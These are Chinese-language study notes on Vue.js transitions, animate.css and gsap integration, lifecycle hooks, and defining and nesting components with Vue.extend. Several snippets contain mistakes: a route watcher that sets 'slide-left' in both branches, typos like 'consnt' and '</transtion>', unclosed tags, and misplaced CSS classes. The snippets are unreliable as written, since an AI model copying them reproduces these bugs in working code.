子页面左滑入的时候 使用的是 name="slide-left"  
子页面右滑出的时候 使用的是 name="silde-right"

那么我们应该怎么操作? 我们可以使用 watch 监听路由的变化 我们可以在 路由的 meta 属性里面定义 是父页面还是子页面

```js
const routes = [
  {
    path: "/",
    name: "parent",
    component: Parent,
    meta: {
      // 父页面我们用 0 来表示
      index: 0
    }
  },
  {
    path: "/child",
    name: "child",
    component: Child,
    meta: {
      // 子页面我们用 1 来表示
      index: 1
    }
  }
]

data() {
  return {
    slideName: ""
  }
},
watch: {
  $route(to, from) {
    // 判断
    if(to.meta.index > from.meta.index) {
      // 说明是当前是父页面 子页面要进来 所以 slideName 应该是 slide-left
      // 父 -> 子
      this.slideName = "slide-left"
    } else {
      // 子 -> 父
      this.slideName = "slide-left"
    }
  }
}
```

最后我们这么修改下:
```html
<transition :name="slideName">
  <router-view></router-view>
</transtion>
```

<br>

### **<transition>组件的使用方式:**
我们看看谁要做动画 谁做动画就用 <transition>目标<transition> 进行包裹
```js 
// 然后我们通过 isShow 属性 控制元素的显示和隐藏看看能不能触发过渡的效果
<transition>
  <h1 v-show='isShow'>你好啊</h1>
<transition>
```

**属性:** 
```html  
<transition name='任意名字'> 
```

**应用场景:**  
当页面上有多个元素需要过渡或者动画的时候 要写上各自的名字  
如果我们给标签起名字了 那么 css样式的里就不能使用默认的v-了要改成下面的样式
```css 
.v-enter-active { }
.任意名字-enter-active { }
```

<br>

### **<transition>组件的标签属性:**
```html
<transition :appear='true'>
```
一上来先自动播放次动画

<br>

### **总结:**
<transition> vue在解析的时候会将这个标签脱掉

<br>

### **过渡的使用方式:**
我们先准备好两个样式 
一个元素从没有在我们的视线 出现在 我们的视线 这个过程叫做来
在这个来的过程当中 vue在目标元素上加了3个类名

```
.hello-enter      进入的起点  相当于 动画里面的from
.hello-enter-to   进入的终点  相当于 动画里面的to
.hello-enter-active   过程中


.hello-leave      离开的起点  相当于 动画里面的from
.hello-leave-to   离开的终点  相当于 动画里面的to
.hello-enter-active   过程中
```

<br>

使用 ``<transition name='hello'>`` 标签对元素进行包裹
定义进入 和 离开时候的样式 注意进入要有 from 和 to

```html
  <transition name='hello'>
    <h1 v-show='isShow'>你好啊</h1>
  <transition>
```
```css
  h1 {
    /* 我们可以不在这里写这个过渡 */
    transition: 0.5s    
  }
  

  /* 进入时候的过渡动画 */
  .hello-enter {
    transform: translateX(-100px)
  }

  .hello-leave-to {
    transform: translateX(0px)
  }

  /* 我们在这里面写也一样 */
  .hello-enter-active {
    transition: 0.5s
  }


  /* 离开时候的过渡动画 */
  .hello-leave {
    transform: translateX(0px)
  }

  .hello-leave-to {
    transform: translateX(-100px)
  }
```

<br>

### **``<transition-group>``的使用方式**
多个元素使用过渡的时候可以这样, 使用方式和 
``<transition>``是一样的

使用 ``<transition-group>`` 对多个元素进行包裹 内部每一个元素要有key值 里面的元素都是一个过渡动画

```js 
<transition-group>
  <h1 v-show='isShow' key='1'>你好啊</h1>
  <h1 v-show='isShow' key='2'>你好啊</h1>
</transition-group>
```

以前我们学习的``<transition>``是用过渡单个元素的 当我们要过渡多个元素的时候 就要使用该组件 ``<transition-group>``

比如我们要对整个列表进行过渡 v-for循环一个列表的时候就可以使用它

<br>

### ``<transition-group>``的特点
**``<transition-group tag="section">`` tag标签属性:**  
```html
<transition-group>
  <!-- 使用transition-group一定要加上key -->
  <div class="item" :key="index" v-for="(item,index) of list">
    {{item}}
  </div>
</transition-group>
```
默认情况下 渲染transition-group里面的结构时候 不会将里面的元素结构进行包裹 如果将把元素结构渲染在一个 ``<section>`` 结构中可以使用 tag 标签属性
```html
<!-- 这样里面的结构就会被section包裹 -->
<transition-group tag="section">
```

- 过渡模式不可用 因为我们不再相互切换特有的元素

- 内部元素总是要提供唯一的 key 

- css过渡的类将会应用在内部的元素中 而不是这个容器本身

<br>

**示例:**
```html
<script setup lang="ts">
import { nextTick, onMounted, reactive, ref, toRef, watch, watchEffect } from 'vue';
import "animate.css"

// 定义一组列表
let list = reactive<number[]>([1,2,3,4,5,6])

const push = () => {
  list.push(list.length + 1)
}

const pop = () => {
  list.pop()
}
 
</script>

<template>
  <div class="content">
    <div class="button-area">
      <button @click="push">push</button>&emsp;
      <button @click="pop">pop</button>
    </div>
    
    <div class="wraps">
      <!-- 包裹整个的列表 -->
      <transition-group
        leave-active-class="animate__animated animate__bounceOut"
        enter-active-class="animate__animated animate__bounceOut"
      >
        <!-- 使用transition-group一定要加上key -->
        <div class="item" :key="index" v-for="(item,index) of list">
          {{item}}
        </div>
      </transition-group>
    </div>
  </div>
</template>

```

<br>

### ``<transition-group>``列表的移动过渡
上面我们完成的过渡都是通过 if show 添加 删除 等逻辑实现的元素变化 从而产生的过渡

这个部分我们通过改变位置来实现过渡

```
vue内部就是基于这个动画库实现的
aerotwist.com/blog/the-hack-is-back/
```

<br>

**要点:**  
标签属性: move-class="" 我们可以指定平移的时候的类名 


这个案例中我们就是指定了平移时的类名
```html
<transition-group
  tag="div"
  class="wraps"
  move-class="move"
>

<style>
.move {
  transition: all 1s;
}
</style>
```

<br>

**示例:**
```html
<script setup lang="ts">
import { nextTick, onMounted, reactive, ref, toRef, watch, watchEffect } from 'vue';
import "animate.css"

/*
  我们要组织好一个矩阵 9 * 9 
  1 2 3 4 5 6 7 8 9
  1 2 3 4 5 6 7 8 9
  1 2 3 4 5 6 7 8 9
  ...

  我们可以通过下面的操作来完成

  new Array(81) 该方式创建的数组 成员都是空的
    [emtry x 81]

  Array.apply(null, {length: 81} as number[])
  该方式创建的数组 有81个undefined 帮我们初始化好了81个成员 相当于我们用undefined占好位置了
*/

// apply的第二个参数本来应该是数组 但是我们传递一个对象 9 * 9 = 81 但是ts监测第二个参数只能是数组 我们断言下
// 然后通过map方法确定每一个成员 index % 9 相当于 0 - 9
let list = reactive(Array.apply(null, {length: 81} as number[]).map((_, index) => ({id:index, number: (index % 9) + 1})))

// 随机函数
const random = () => {
  // 先进行打乱排序
  let arr = list.sort(() => Math.random() - 0.5).slice(0, 81)

  // 自己实现的打乱数组中的排序
  list.length = 0
  
  // 将打乱后的结构push到list中
  list.push(...arr)


  /*
    也可以使用 lodash 来做 _.shuffle(collection)
    npm i lodash -S
    npm i @types/lodash -D

    import _ from "lodash"

    list = _.shuffle(list)
  */
}
 
</script>

<template>
  <div class="content">

    <div>
      <button @click="random">随机</button>
    </div>

    <!-- 包裹整个的列表 -->
    <!-- 
      move-class: 平移的动画
     -->
    <transition-group
      tag="div"
      class="wraps"
      move-class="move"
    >
      <div 
        class="items" 
        :key="item.id" 
        v-for="(item,index) of list"
      >
        {{item.number}}
      </div>
    </transition-group>

  </div>
</template>

<style scoped>

.move {
  transition: all 1s;
}

button {
  background-color: #e9e9e9;
}

.wraps {
  display: flex;
  flex-wrap: wrap;
  width: calc(25px * 10 + 9px);
}

.items {
  width: 25px;
  height:25px;
  border: 1px solid #212121;
} 

</style>
```

<br>


### ``<transition-group>``数字的过渡效果
```html
<script setup lang="ts">
import { nextTick, onMounted, reactive, ref, toRef, watch, watchEffect } from 'vue';
import "animate.css"

import { gsap } from "gsap";

const num = reactive({
  current: 0,
  tweenedNumber: 0
})

watch(() => num.current, (n) => {
  // 参数1:过渡的对象 参数2: 配置项 配置项可以过渡对象中的属性
  gsap.to(num, {
    duration: 1,
    // 当 num.current 发生变化的时候 将新值赋值给tweenedNumber
    tweenedNumber: n,
  })
})

</script>

<template>
  <div>
    <input v-model="num.current" type="number" step="20">
    <div>
      {{num}}
    </div>
  </div>
</template>
```

<br>

### **集成第三方过渡动画: animate.css**
上面的例子中所有的动画都是我们自己写的 比如使用了animation 或者 transition来实现的动画效果  
但是git上有很多已经成型的第三方库 

```
https://animate.style/
```

**安装:**  
```
npm install animate.css --save
```

<br>

**引入:**  
比如入口文件 或者 某个组件内引入
```
import "animate.css"
```

<br>

**复制animate库中的类名:**  
页面的右侧有一个预览列表 上面每一个item都有一个复制的标签 我们点击复制 就能复制到该效果的类名

<br>

**在transition组件中 通过以下的标签属性指定我们上面复制的类名**

animate3中下面的写法没有问题 但是aninmate4中则不行
```html
<transition
  leave-active-class="animate__fadeOut"
  enter-active-class="animate__fadeIn"
>
  <div v-if="flag" class="box">内容</div>
</transition>
```

<br>

在animate4中类名的前面要加上 animate 特有的前缀
```html
<transition
  leave-active-class="animate__animated animate__fadeOut"
  enter-active-class="animate__animated animate__fadeIn"
>
  <div v-if="flag" class="box">内容</div>
</transition>
```

<br>

上面在animate4中需要加上前缀 我们可以尝试下面的方式加前缀 我没有试验哈 **但我觉得不好用哈哈**

**``<transition name='animate__animated animate__bounce'>``**  
使用 name 属性来加类名前缀

<br>

```html
<transition
  name='animate__animated animate__bounce'
  enter-active-class='找个好玩的动画类名'
  leave-active-class='找个好玩的动画类名'
>
```

<br>

### transition 的标签属性

**<font color="#C2185B">name:</font>**  
string  
用于自动生成 CSS 过渡类名, 例如  
``<transition name="fade">`` 则类名自动扩展为 .fade-enter  
默认为 v-

<br>

**<font color="#C2185B">appear:</font>**  
boolean  
是否在初始渲染时使用过渡。默认为 false。

通过这个属性可以设置初始节点过渡 就是页面加载完成就开始动画 对应3个状态

```html
<!-- 
  通过定义下面的3种状态来控制 初始动画的效果 
-->
<transition
  appear: true

  appear-from-class=""
  appear-active-class=""
  appear-to-class=""
>
```

<br>

**<font color="#C2185B">type:</font>**  
string  
可选值: transition | animation

默认 Vue.js 将自动检测出持续时间长的为过渡事件类型。

<br>

**<font color="#C2185B">duration:</font>**  
number | { enter: number, leave: number } 

指定过渡的持续时间。比如动画效果必须50ms内执行完毕

默认情况下，Vue 会等待过渡所在根元素的第一个 transitionend 或 animationend 事件。

<br>

**<font color="#C2185B">enter-class</font>**  
**<font color="#C2185B">leave-class</font>**  

<br>

**<font color="#C2185B">enter-to-class</font>**  
**<font color="#C2185B">leave-to-class</font>**   

<br>

**<font color="#C2185B">enter-active-class</font>**  
**<font color="#C2185B">leave-active-class</font>**  

用来代替vue默认类名 指定我们自定义类名

<br>

之前我们要是想使用过渡的话 必须要使用 vue 给我们预定的类名 xxx-enter-active
```css
.hello-enter-active { }
```

现在我们可以通过 上面的两个标签属性 来修改vue指定的类名 比如  
```html
<transition 
enter-active-class: "e-active">

<!-- 上面修改为 e-active 下面我们就可以使用e-active来代替原先的 .hello-enter-active 才能完成的事情 -->
<style>
  .e-active { }
</style>
```

这个功能一般我们都会搭配 animate.css 库 来使用 因为库里有很多的自定义名

<br>

**总结:**  
如果我们想用 动画写 那么使用 v-enter-acitve 和 v-leave-active 就够用了  
如果我们想用 过渡写 那么就要分别设置from to的类名

<br>

### **transition的生命周期**
该组件有8个生命周期

场景: 有的时候css满足不了 需要js来计算 所以提供了这样的解决方案

这些生命周期钩子 可以 配合 js动画库 gsap 来使用
```js
// 对应 enter-from: 进入之前
@before-enter="beforeEnter"

// 对应 enter-active: 过程
@enter="enter"

// 对应 enter-to: 离开
@after-enter="afterEnter"

// 显示过渡打断时候的回调
@enter-cancelled="enterCancelled"

// 对应 leave-from
@before-leave="beforeLeave"

// 对应leave-active
@leave="leave"

// 对应leave-to
@after-leave="afterLeave"

// 离开过渡打断时候的回调
@leave-cancelled (v-show only)="leaveCancelled"


// 不知道啥作用
@before-appear=""
@appear=""
@after-appear=""
@appear-cancelled=""
```

上面对应的处理函数会接收到参数 我们拿一个举例子
```html
<transition @before-enter="beforeEnter">

<script>
  // 每一个钩子都会接收 el 参数
  consnt beforeEnter = (el: Element) => {

  }

  // active 过程的周期里面额外有一个参数 done 它是一个函数 我们可以通过 done() 来确定什么时候走下一个逻辑
  consnt enter = (el: Element, done:Function) => {
    // 动画过渡3秒后完成 不加done 直接会进入下一个钩子
    setTimeout(() => {
      done()
    }, 3000)
  }

  consnt afterEnter = (el: Element) => {
    // 因为上面3秒后才调用的done 所以这里的逻辑会等3秒之后再执行
    console.log("过渡完成")
  }
</script>
```

<br><br>

# 生命周期:
生命周期回调函数 生命周期函数 生命周期钩子 vue在关键时刻帮我们调用的一些特殊名称的函数
生命周期函数的书写位置和el methods等同级
vue发现了模板开始解析 生成虚拟DOM 然后转成真实DOM 然后挂载到页面上

生命周期函数里面的this是vm 或 组件的实例对象

<br>

### **挂载流程:**
**初始化部分:**  该阶段会执行1次
```
  new Vue()  --  
  beforeCreate  --  created  --  beforeMount  --  mounted
```

<br>

**更新部分:**  该阶段会执行N次  
在初始化阶段是没有新旧的 *虚拟DOM比较* 的 但是 *在更新的时候就有* 这个环节
```
  beforeUpdate  --  updated
```

<br>

**销毁部分:**   
当我们调用 vm.$destroy() 的时候进入销毁流程 此时能访问到数据和事件 但是对数据的修改不再会触发更新了

完全效果一个示例 清理它与其它组件的链接 解绑它的全部指令以及自定义事件的监听器 注意销毁后原生的dom事件还在  
当vm被销毁后 页面的数据还是有的 只是vm走了成果还在 只不过dom没人帮我们管理了
```js 
  this.$destroy()
```

<br>

### **流程图:**

```
                       new Vue()
                          ↓
                Init Event & Lifecycle
          初始化: 生命周期 事件 但数据代理还未开始
  (此阶段在制定规则 比如生命周期有多少个 都叫什么 什么时候调用他们)

                          ↓

                    beforeCreate
                    (生命周期函数)
    创建之前 此时 无法通过vm访问到data中的数据 methods中的方法
          也就是说它是在数据代理 和 数据监测创建之前
    
                          ↓

            Init Injections & reactivity
               初始化: 数据监测 数据代理

                          ↓

                       created
                     (生命周期函数)
  创建完毕 此时 可以通过vm访问到data中的数据 methods中配置的方法
  
                          ↓

        根据我们传入的配置开始判断 以什么作为模板来解析
  (有没有传递el配置项 如果传递了同时没有传递template配置项
                    那么<div id='root'>这个整体的区域就作为模板)
在此阶段Vue开始解析模板 生成虚拟DOM(内存中) 注意页面还不能显示解析好的内容

                  在这步里已经出现了虚拟DOM
                  
                          ↓

                     beforeMount
                     (生命周期函数)
  此时: 1 页面呈现的是 未经Vue编译的DOM结构 2 所有对DOM的操作最终都不奏效
          Vue已经把模板解析好 但是还没有网页面上放
          
                          ↓

          create vm $el and replace el with it
            将内存中的虚拟DOM转为真实的DOM插入页面
            
                          ↓

                        mounted
                     (生命周期函数)
  此时:  1 页面中呈现的是经过vue编译的DOM 2 对DOM的操作均有效(尽可能避免)至此初始化过程结束

  一般在此进行 开启定时器 发送网络请求 订阅消息 绑定自定义事件 等 初始化操作
  

      // 如果我们修改了数据的话 会进入更新流程 然后进入销毁流程 // 
                          ↓

                     beforeUpdate
                     (生命周期函数)
      此时: 数据是新的 但页面是旧的 即: 页面尚未和数据保持同步
      
                          ↓

           Virtual DOM re-render and patch 
  根据新数据 生成新的虚拟DOM 随后与旧的虚拟DOM进行比较 最终完成页面的更新 即:  完成了 Model - > View的更新
  
                          ↓

                        Update
                     (生命周期函数)
      此时: 数据是新的 页面也是新的 即:  页面和数据保持同步
      
                          ↓

      // 当vm.destroy() 方法被调用的时候 会入销毁流程 // 
                          ↓

                    beforeDestroy
                    (生命周期函数)

        注意 在此阶段对数据的操作 页面都不会再更新了

  此时:  
      vm中所有的 data methods 指令等等都处于可用状态 马上要执行销毁过程 
        一般在此阶段 关闭定时器 取消订阅消息 解绑自定义事件等收尾动作

                          ↓

                      destroyed
                     (生命周期函数)
```

<br>


**<font color="#C2185B">beforeCreate(数据代理 监测 创建前)</font>**  
data 和 el均未初始化，值为undefined

<br>

**<font color="#C2185B">created(数据代理 监测 创建后)</font>**  
data、mounted、watch等已经完成初始化，但是 el dom树还未挂载

当组件被创建出来之后, 会回调的一个生命周期函数, 一旦这个组件被创建出来了就会回调这个函数

<br>

**<font color="#C2185B">beforeMount(载入前)</font>**  
data 和 el 已经完成初始化，但此时el并没有渲染进数据，只是虚拟DOM节点

完成el和data初始化 在挂载开始之前被调用 可以发送数据请求 在服务器端渲染期间不会被调用

<br>

**<font color="#C2185B">mounted(组件模板内容被挂载到DOM的时候, 执行该回调)</font>**  
el dom树已经渲染完成并挂载到实例上

Vue完成模板的解析并把初始的真实的DOM元素放入页面后(挂载完毕)调用mounted生命周期函数  
该函数只调用一次 初始的真实DOM挂载 以后再发生变化那就叫做更新了

**扩展部分:**  
我一直认为 mounted 会等所有的资源加载完毕后的回调 但是今天发现在mounted方法中去获取图片资源的宽度和高度的时候 可能获取不到 缓存之后获取才会变成正常的值
也就是说 在 mounted 里面图片资源的请求已经发送完成 但是图片资源的缓存还并未响应回来 所以在 mounted中可以获取到图片 但是并不能获取到实际的资源数据  
如果要对图片资源进行操作 应该在 img 标签中使用 load 事件  

<br>

**<font color="#C2185B">beforeUpdate(更新前)</font>**  
data 数据更新前调用

数据更新时调用 挂载完成之前访问现有DOM 比如手动移除已添加的事件监听器 也可以进一步修改数据  
在服务器渲染期间不会被调用 只有初次渲染会在服务端调用

<br>

**<font color="#C2185B">updated(页面刷新, 执行该回调)</font>**  
data 数据更新后调用

当页面发生更新的时候会调用这个函数
比如我们的组件data中有message数据, 我把这个message数据放到组件的模板里面{{message}}, 因为这个是动态的, 假如data中的数据发生改变的时候, 页面就会刷新为了显示最新的数据 只要界面一更新完的时候就会执行这个updated()函数

<br>

**<font color="#C2185B">this.$destroy()</font>**  
自杀 销毁组件 开发的时候很少这么干 开发的时候都是他杀没的

<br>

**<font color="#C2185B">beforeDestroy(销毁前)</font>**  
组件销毁前调用 （常用于销毁监听事件）

在这里一般做一些收尾的工作 比如清除定时器 下面处于组件销毁的阶段, 该阶段没有数据绑定 没有交互了  
同时在这个逻辑里面将timer设置为null

服务器端渲染期间不会被调用
```js 
created() {
  this.count()
},

methods: {
  count() {
    this.timer = setInterval(() => {
      this.num++
      console.log(this.num)
    }, 1000)
  }
},

beforeDestroy() {
  clearInterval(this.timer)
  this.timer = null
},
destroyed() {
  console.log("我被销毁了")
},
```

<br>

**<font color="#C2185B">destroyed(销毁后)</font>**  
组件销毁后调用

vue实例销毁后调用。调用后 Vue实例指示的所有东西都会被解绑定 所有的事件监听器会被移除 所有的子实例也会被销毁  
服务器端渲染期间不会被调用 提示已删除

<br>

下面两个函数 只有该组件被保持了状态使用了 ``<keep-alive>`` 时才是有效的, 我们可以看看接下来的例子

**<font color="#C2185B">activated() { ... }</font>**  
当页面处于活跃状态的时候, 执行该回调

<br>

**<font color="#C2185B">deactivated() { ... }</font>**  
当页面不处于活跃状态的时候, 执行该回调

<br>

### **是否能获得节点**
```
生命周期    是否获取dom节点    是否可以获取data    是否获取methods
beforeCreate      否                否                否
created           否	              是	              是
beforeMount       否	              是	              是
mounted           是	              是	              是
```

<br>

**<font color="#C2185B">this.$nextTick(() => { })</font>**  
nextTick 有下一轮的意思 所以是*一次重新渲染模板之后*再执行回调的逻辑  
*当页面上元素被重新渲染之后才会执行回调中的代码*

*它会在DOM重新渲染完毕 解析完毕之后执行内部的回调* 它能确保我们得到了最新的DOM节点后 再去对节点进行操作

**应用场景:** 
当改变数据后  
当改变数据后 要基于更新后的新DOM  
当改变数据后 要基于更新后的新DOM 进行某些操作的时候 要在nextTick所指定的回调函数中执行

**作用:**   
在下一次DOM更新结束后执行其指定的回调

<br>

### **vue 父子组件生命周期的执行顺序:**
最先和最后执行的都是父组件生命周期，子组件生命周期按照组件生命周期执行顺序在中间，当子组件开始挂载时开始执行子组件生命周期

**组件初始化过程:**  
```
父beforeCreate -> 
  父created -> 
    父beforeMount -> 
      子beforeCreate -> 
        子created -> 
          子beforeMount -> 
            子mounted -> 
              父mounted
```

<br>

**组件更新过程:**  
```
父beforeUpdate -> 
  子beforeUpdate -> 
    子updated -> 
      父updated
```

<br>

**组件销毁过程:**  
```
父beforeDestroy -> 
  子beforeDestroy -> 
    子destroyed -> 
      父destroyed

```

<br>

**注意事项:**  
1. 所有的生命周期钩子自动绑定 this上下文到实例中

2. 父子组件的生命周期都是同步执行的，如果在父组件中进行异步接口请求，并用于子组件渲染，建议在子组件的标签加上 v-if="传递的数据"，或者还可以在子组件中使用watch监听

3. 虽然updated函数会在数据变化时被触发，但却不能准确的判断是那个属性值被改变，所以在实际情况中用computed或watch函数来监听属性的变化

4. 在使用vue-router时有时需要使用keep-alive来缓存组件状态，这个时候 created 等组件初始化钩子就不会被重复调用了，只能触发 activated、deactivated这两个keep-alive专属钩子


<br>

### **总结**
常用的生命周期钩子:
1. mounted:  发送ajax请求 启动定时器 绑定自定义事件 订阅消息等初始化动作
2. beforeDestroy:  清楚定时器 解绑自定义事件 取消订阅消息等 收尾工作

关于销毁vue实例: 
1. 销毁后借助vue开发者工具看不懂任何信息
2.  销毁后自定义事件会失效 但原生dom事件依然有效
3. 一般不会在beforeDestroy操作数据 因为几遍操作数据 也不会再触发更新流程了

<br><br>

# 什么是组件化
人面对复杂问题的处理方式  
任何一个人处理信息的逻辑能力都是有限的, 所以当面对一个非常复杂的问题的时候, 我们不太可能一次性搞定一大堆的内容

但是 我们人有一种天生的能力, 就是将问题进行拆解, 如果将一个复杂的问题, 拆分成很多个可以处理的小问题, 再将其放在整体当中, 你会发现大的问题也会迎刃而解

<br>

### **组件化的思想**
如果我们将一个页面中所有的处理逻辑全部放在一起, 处理起来就会变得非常的复杂, 而且不利于后续的管理以及扩展
但如果, 我们将一个页面拆分成一个个小的功能块, 每个功能块完成属于自己这部分独立的功能, 那么之后整个页面的管理和维护就变得非常的容易了

<br>

### **组件的定义**
实现应用中局部功能代码和资源的集合
每一个部分都有自己的html css js文件 形成属于这一个部分的结构样式交互方便复用

<br><br>

# 组件化编码的流程
### 拆分组件:
- 做之前先分析, 页面上我们应该划分几个组件来开发
- 按照组件 将原页面对应的dom部分 粘贴到 组件的template中
- 还要将css样式也按组件来粘贴进去

<br>

### 静态组件:
静态组件显示在页面 数据是固定的 没有交互

<br>

### 动态组件:
动态组件两个方面是动态:
1. 动态显示
2. 交互

<br>

当有很多组件的时候, 数据放在哪个组件里面, 那就要看这个数据是某些组件要用到还是某个组件中要用到 如果是某些组件要用到 那就放在公共的父组件里面

**注意:**  
数据在哪个组件, 更新数据的行为(方法) 就应该定义在哪个组件

<br><br>

# 创建组件
组件的创建分为两种形式
1. 非单文件组件
2. 单文件组件

<br>

### **非单文件组件**
**定义:**   
一个文件中包含有n个组件 1个html里面有4个组件

<br>

### **单文件组件**
**定义:**   
一个.vue文件里面就是一个组件

<br>

# 非单文件组件的书写方式
就是一个html文件里面定义好多个组件 互相嵌套使用

比如我们一个html页面中有两个组件 那么我们就需要在这个html文件中创建两个组件是么?  
vue中普通创建组件要分为3步
- 创建组件 **Vue.extend**
- 注册组件 **components / Vue.component**
- 使用组件

<br>

### **<font color="#C2185B">Vue.extend({配置对象}): 创建组件</font>**
Vue.extend() 通过该方法创建组件

**参数:** 
配置对象是用于配置该组件相关内容的 其配置项的内容和new Vue的时候基本一致

<br>

**啥不一致呢？**  
- 定义组件时不要写el配置项   
因为组件是vm(vue实例)下面的所有组件被vm管理 vm来决定整个组件为哪个容器服务
  
- 组件内部的data配置项要写成一个函数 不要写对象的形式    
如果组件中使用了对象形式的data 3组件都引用了这个data当一个修改的时候回影响到其它的组件
    ```
    function data() {
      return { a: 1 }
    }

    const c = data()    // 这样c会有一个全新的对象
    const d = data()    // 这样d也会有一个全新的对象
    ```
  
- 使用 template 配置项 在组件内部定义模板

<br>

**还有一种用法参考 全局挂载组件:**  
该方法返回的是一个 构造器, 我们需要new构造器 才会生成对应的组件
```js
let Constructor = Vue.extend(组件)
let vm = new Constructor({配置对象})
```

<br>

### **<font color="#C2185B">Vue - components配置项 注册局部组件</font>**
¥在vm上使用新的配置项 components 它的类型是一组组的kv

我们在创建组件的时候用于接收的变量并不是组件名 真正的组件名是在components里面定义的 当然你也可以接收名 和 组件名起一样的

接收明只是用于找到该组件 并不是 给该组件起名字

```js 
components: {
  组件名:  创建组件时候定义的接收变量
}
```

<br>

### **<font color="#C2185B">Vue.component('组件名', '组件在哪') 注册全局组件</font>**
全局定义的组件 全局可用

**参数1:**  
组件名就是我们以后要使用的组件标签

**参数2:** 
组件在哪就是我们创建组件的时候 定义的接收变量  
也可以直接将创建组件的配置对象填写到参数2的位置
```js 
// 省略 Vue.extents() 创建组件了
Vue.component('student', {组件的配置项})
```

<br>

### **<font color="#C2185B">使用组件</font>**
使用组件标签的形式在div#root里面使用
```js 
<Student></Student>
```

<br>

### **示例:**
```html
<div id="root">
  <!-- 使用 组件标签 -->
  <Student></Student>
</div>

<script>

// 在学生组件中 定义template 和 data
const Student = Vue.extend({
  data() {
    return {
      name: 'sam',
      age: 18
    }
  },

  // 多级结构要使用根标签包裹
  template: `
  <div>
    <h3>学生组件</h3>
    <h3>{{name}}</h3>
    <h3>{{age}}</h3>
  </div>
  `
})


// 在Vue实例中注册组件
new Vue({
  el: '#root',
  components: {
    Student
  }
})
</script>
```

<br>

**组件当中需要注意的点:**
- 组件名:  
如果组件名是一个单词组成 可以使用纯小写字母 或者 纯大写字母的形式  
eg: components:{ student: 创建组件时定义的接收组件的变量}

- 如果组件名是多个单词组件 
  全部小写 多个单词之间使用 - 来连接  my-student    
  eg: components:{ 'my-student': 创建组件时定义的接收组件的变量}

  多个单词的首字母全部大写 (仅在脚手架环境里面才可以使用该方式)
  eg: components:{ MyStudent: 创建组件时定义的接收组件的变量}

- 不要使用html标签名作为组件名

<br>

**组件中的name配置项是在开发者工具中呈现的名字**  
该怎么注册怎么注册 name配置项只是在开发者工具上使用的名字

<br>

**组件标签:**  
可以写自闭合标签的形式 但是必须保证在脚手架的环境下 普通引入vue.js文件的环境不能使用该形式

<br><br>

# 注册组件的语法糖
在上面注册组件的方式, 可能会有些繁琐 
```js
// 先使用 Vue.extend({}) 创建组件
let component = Vue.extend({
  template: `<div>hello</div>`,
  data() {
    return {
      flag: true
    }
  }
})

// 注册组件
Vue.component("my-con", component)
```

Vue为了简化这个过程, **提供了注册的语法糖** 主要是省去了调用 Vue.extend()的步骤, 而是可以直接使用一个对象来代替

我们可以把在extend()方法中传递的对象里面的内容 直接作为component的第二个参数
```js
// 第2个参数相当于 Vue.extend() 里面的配置对象
Vue.component('组件名', {
  template:`
    内容...
  `
});
```

<br>

### **局部注册组件的语法糖**
同理 当我们使用局部注册的方式的时候 也可以使用上面的方式
```js
export default {
  name: "app",
  data() {
    return {
      flag: true
    }
  },

  // 这里
  components: {
    '组件名': {
      template:`
        内容...
      `
    }
  }
}
```

<br><br>

# 组件的嵌套 (父组件 和 子组件)
在哪个组件中注册的 就去那个结构当中写组件标签

<br>

**在一个组件(A)中注册另一个组件(B) 它们的关系就是父子组件**  
子组件可以在父组件的 template 中使用, 这样在被管理区域内使用父组件的标签, 会带上子组件的内容 

<br>

### **父组件内注册子组件的方式**
在创建 父组件 时, 在它的配置对象中使用 components 配置项
```js 
const son = Vue.extend({
  template:`
    <div>
      <h2>我是子组件的标题</h2>
      <h4>我是子组件的内容~~~</h4>
    </div>
  `
})

const fatherC = Vue.extend({
  template:`
    <div>
      <h2>我是父组件的标题</h2>
      <h4>我是父组件的内容~~~</h4>
    </div>
  `,

  // 在父组件中注册子组件
  components: {
    'cpn-son':son
  }
})
```

<br>

### **注意要点**
1. 先创建子组件构造器, 再创建父组件构造器 也就是说父组件要在下面
2. 组件构造器的template中必须有一个根元素(也就是必须是一个div)
3. 在父组件中注册的子组件, 只能通过父组件来调用 不能单独调用(要想单独调用要在全局 或 局部进行注册)
4. 子组件只能在父组件中被识别


### **代码部分:**
```html
<div id="app">

  <!-- 4. 在被管理区域内使用父组件(自动调用了子组件的内容) -->
  <cpn-father></cpn-father>
</div>

<script>
// 1. 先创建子组件
const son = Vue.extend({
  template:`
    <div>
      <h2>我是子组件中的标题</h2>
      <h4>我是子组件中的内容~~~</h4>
    </div>
  `
})


// 2. 在创建父组件, 并在父组件中注册子组件
const father = Vue.extend({
  template:`
    <div>
      <h2>我是父组件中的标题</h2>
      <h4>我是父组件中的内容~~~</h4>

      <cpn-son></cpn-son>
    </div>
  `,
  components: {
    'cpn-son':son
  }
})


// 3. 将父组件在vue实例中注册
let app = new Vue({
  el:'#app',
  components: {
    'cpn-father': father
  }
})
</script>


<!-- 不能直接使用 子组件 的演示 -->
<div id='app'>
  <cpn-father></cpn-father>

  <!-- 不能使用 因为son组件是在father组件中定义的 -->
  <cpn-son></cpn-son>        
</div>
```

**原因:**  
在被管理区域内使用father组件的时候, father组件中template中的内容就已经被编译好了(里面是father的完整内容+son的完整内容)

vue会先解析father中的template中的内容 在解析模板的过程中就发现了有cpn-son的组件标签, 这时候vue就会优先在自己的组件内部去找有没有被注册过 

如果有找到 vue就会将cpn-son对应的模板里的内容 直接拿到父组件的模板内做一个粘贴(把内容替换掉cpn-son的标签), 

如果自己组件内部没有它会去全局里面找, 找到也会做相对应的替换, 因为spn-son根本就没有经过vue实例对象, 所以vue实例对象压根就不知道cpn-son的存在

所以这时候我们在被管理区域使用cpn-son的话 就会报错因为vue实例对象根本不知道cpn-son

<br><br>

# VueComponent构造函数
这节里面我们了解一下组件是什么样的数据类型
```js 
const Student = Vue.extend({
  data() {
    return { name: 'sam', age: 18 }
  },
  template: `
  <div>
    <h3>学生组件</h3>
    <h3>{{name}}</h3>
    <h3>{{age}}</h3>
  </div>
    
  `
})

new Vue({
  el: '#root', components: { Student }
})
```

我们尝试的看下 ``console.log(Student)`` 发现 它的本质就是一个构造函数 那既然是一个构造函数 那么当我们使组件的时候 就应该在前面加一个new吧 可是我们没调用啊
```js  
// Vue组件
ƒ VueComponent (options) {
    this._init(options);
  }
```

<br>

### **总结**
1. Student组件本质是一个名为VueComponent的构造函数 且不是程序员定义的 是Vue.extend生成的

2. 我们只需要写``<Student />`` vue在解析的时候就会帮我们创建Student组件的实例对象 即vue帮我们执行的 new VueComponent() 

3. 特别注意: 每次调用Vue.extend 返回的都是一个全新的VueComponent

4. 关于this指向  
    组件配置中:  
    data函数 methods中的函数 watch中的函数 computed中的函数 他们的this均是 VueComponent实例对象

    new Vue配置中  
